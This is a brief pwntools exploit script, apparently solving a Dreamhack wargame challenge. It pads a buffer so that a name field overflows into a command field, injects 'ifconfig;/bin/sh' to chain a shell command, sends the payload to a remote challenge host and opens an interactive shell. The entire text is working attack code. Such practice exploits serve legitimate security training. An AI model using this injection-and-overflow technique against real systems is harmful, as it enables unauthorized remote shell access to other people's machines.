from pwn import *

# center_name + padding + cmd_ip
payload = b'\x90'*24 + b'\x00'*8 + b'ifconfig;/bin/sh' 

r = remote('host3.dreamhack.games', 13264)

r.sendline(payload)

r.interactive()